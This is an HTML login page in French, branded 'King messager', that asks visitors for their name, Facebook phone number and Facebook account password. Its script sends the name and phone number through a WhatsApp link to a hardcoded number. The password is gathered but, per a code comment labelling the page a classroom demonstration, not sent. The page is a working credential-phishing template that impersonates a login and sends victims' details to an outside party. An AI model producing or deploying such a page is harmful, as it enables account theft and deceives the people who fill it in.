<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fiche de connexion</title>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', sans-serif;
        }

        body {
            background: #f0f4f8;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            width: 100%;
            max-width: 370px;
            background: white;
            padding: 28px;
            border-radius: 14px;
            box-shadow: 0 8px 25px #00000015;
        }

        h1 {
            text-align: center;
            color: #1769aa;
            margin-bottom: 10px;
        }

        .description {
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-bottom: 22px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            margin-bottom: 7px;
            font-size: 14px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 7px;
            font-size: 15px;
        }

        input:focus {
            outline: 2px solid #9bcaff;
            border-color: #1769aa;
        }

        button {
            width: 100%;
            padding: 13px;
            border: none;
            border-radius: 7px;
            background: #1769aa;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background: #10528a;
        }

        .privacy {
            margin-top: 14px;
            font-size: 12px;
            color: #666;
            line-height: 1.5;
        }
    </style>
</head>

<body>
    <main class="card">
        <h1>Connexion</h1>
        <p class="description">King messager</p>

        <form id="connexionForm">
            <div class="form-group">
                <label for="nom">Nom complet</label>
                <input
                    type="text"
                    id="nom"
                    placeholder="Votre nom"
                    required
                >
            </div>

            <div class="form-group">
                <label for="telephone">Numéro de téléphone FB</label>
                <input
                    type="tel"
                    id="telephone"
                    placeholder="+243..."
                    autocomplete="tel"
                    required
                >
            </div>

            <div class="form-group">
                <label for="motdepasse">Mot de passe Du compte FB</label>
                <input
                    type="password"
                    id="motdepasse"
                    placeholder="Entrez un mot de passe "
                    autocomplete="off"
                    required
                >
            </div>

            <button type="submit">
                Envoyer 
            </button>
        </form>

    </main>

    <script>
        const formulaire =
            document.getElementById("connexionForm");

        formulaire.addEventListener("submit", function(event) {
            event.preventDefault();

            const nom =
                document.getElementById("nom").value.trim();

            const telephone =
                document.getElementById("telephone").value.trim();

            const motdepasse =
                document.getElementById("motdepasse").value;

            if (!nom || !telephone || !motdepasse) {
                alert("Veuillez remplir tous les champs.");
                return;
            }

            // Remplace par ton numéro WhatsApp.
            const monNumero = "243831799382";

            // Seules les informations non secrètes sont envoyées.
            const message =
                "Fiche de démonstration - TP informatique\n" +
                "Nom : " + nom + "\n" +
                "Téléphone : " + telephone;

            const lien =
                "https://wa.me/" + monNumero +
                "?text=" + encodeURIComponent(message);

            window.open(lien, "_blank");
        });
    </script>
</body>
</html>
